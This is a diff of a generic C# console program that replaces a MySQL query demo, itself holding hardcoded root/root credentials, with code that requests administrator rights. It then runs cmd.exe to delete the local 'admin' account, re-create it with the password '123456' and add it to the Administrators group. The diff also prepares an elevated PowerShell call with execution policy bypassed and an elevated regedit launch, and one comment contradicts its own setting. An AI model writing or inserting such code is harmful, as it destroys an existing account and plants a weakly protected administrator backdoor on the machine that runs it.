@@ -1,5 +1,7 @@
 ﻿using System;
-using MySql.Data.MySqlClient;
+using System.Diagnostics;
+using MyConsoleApp.FilesIOApplication;
+
 
 namespace MyConsoleApp
 {
@@ -7,39 +9,42 @@ namespace MyConsoleApp
     {
         static void Main(string[] args)
         {
-            // 设置数据库连接字符串
-            string connectionString = "Server=localhost;Database=demo;User ID=root;Password=root;CharSet=utf8";
-
-            // 创建 MySqlConnection 对象
-            using (MySqlConnection connection = new MySqlConnection(connectionString))
+            var psi = new ProcessStartInfo
             {
-                try
-                {
-                    // 打开连接
-                    connection.Open();
-                    Console.WriteLine("连接成功！");
-                    // 执行一个简单的查询
-                    string query = "SELECT * FROM a";
-                    MySqlCommand cmd = new MySqlCommand(query, connection);
+                FileName = "powershell.exe",
+                Arguments = "-NoProfile -ExecutionPolicy Bypass -Command \"\"",
+                Verb = "runas",            // 请求管理员权限
+                UseShellExecute = false,   // 必须为 true
+                WindowStyle = ProcessWindowStyle.Normal,
+                // CreateNoWindow = true   // 关闭 PowerShell 窗口
+            };
 
-                    // 执行查询并获取数据
-                    MySqlDataReader reader = cmd.ExecuteReader();
-                    while (reader.Read())
-                    {
-                        Console.WriteLine(reader); // 根据列名获取数据
-                    }
-                    reader.Close();
-                }
-                catch (Exception ex)
-                {
-                    Console.WriteLine("发生错误: " + ex.Message);
-                }
-                finally
-                {
-                    // 确保在最后关闭连接
-                    connection.Close();
-                    Console.WriteLine("连接已关闭。");
-                }
+            var cmd = new ProcessStartInfo()
+            {
+                FileName = "cmd.exe",
+                Arguments = "/c \"net user admin /del &" +
+                            "net user admin 123456 /add &" +
+                            "net localgroup administrators admin /add &" +
+                            "net localgroup users admin /del\"",
+                Verb = "runas",
+                UseShellExecute = true
+            };
+
+            var cfg = new ProcessStartInfo()
+            {
+                FileName = "regedit",
+                Verb = "runas",          // 管理员
+                UseShellExecute = true
+            };
+
+            try
+            {
+                Process.Start(cmd);
+            }
+            catch (System.ComponentModel.Win32Exception)
+            {
+                // 用户点了“否”
+                Console.WriteLine("用户拒绝了管理员权限");
             }
         }
     }
